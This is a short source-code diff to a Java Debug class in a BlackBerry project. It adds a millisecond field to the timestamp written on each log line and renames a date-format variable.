@@ -13,6 +13,7 @@ import java.util.Date;
 import net.rim.device.api.i18n.DateFormat;
 import net.rim.device.api.system.EventLogger;
 import net.rim.device.api.system.LED;
+import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
@@ -355,16 +356,19 @@ public final class Debug {
              * Date());
              */
 
-            final DateFormat format = DateFormat
+            final DateFormat formatTime = DateFormat
                     .getInstance(DateFormat.TIME_FULL);
-            final String time = format.formatLocal(timestamp);
+
+            final String time = formatTime.formatLocal(timestamp).substring(0,
+                    8);
+            String milli = NumberUtilities.toString(timestamp % 1000, 10, 3);
 
             /*
              * String time = calendar.get(Calendar.HOUR)+":"+
              * calendar.get(Calendar.MINUTE)+":"+ calendar.get(Calendar.SECOND);
              */
 
-            logToFile(time.substring(0, 8) + " " + message, priority);
+            logToFile(time + " " + milli + " " + message, priority);
         }
 
         if (logToEvents) {
